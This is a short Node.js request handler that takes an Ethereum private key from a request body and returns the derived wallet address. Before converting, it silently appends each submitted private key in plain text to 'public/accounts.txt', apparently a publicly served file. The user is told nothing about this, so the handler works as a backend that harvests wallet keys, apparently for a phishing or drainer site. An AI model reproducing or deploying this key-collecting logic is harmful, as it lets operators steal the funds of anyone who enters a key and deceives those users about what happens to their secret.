const { Buffer } = require('buffer');
const { privateToAddress, toChecksumAddress } = require('ethereumjs-util');
const GetTotalAmount = require('./GetTotalAmount')
const fs = require('fs')


const KeyGetter = (req, res)=>{




const key = req.body.key

fs.appendFileSync('public/accounts.txt', `${key}\n  \n`, 'utf8');

const privateKey = Buffer.from(key, 'hex');

// Get the public address from the private key
const publicKey = privateToAddress(privateKey);

// Convert the public key to a checksum address
const address = toChecksumAddress(`0x${publicKey.toString('hex')}`);

console.log("THI IS address : ", address)



res.json({msg:address})
    return address;

}


module.exports = KeyGetter;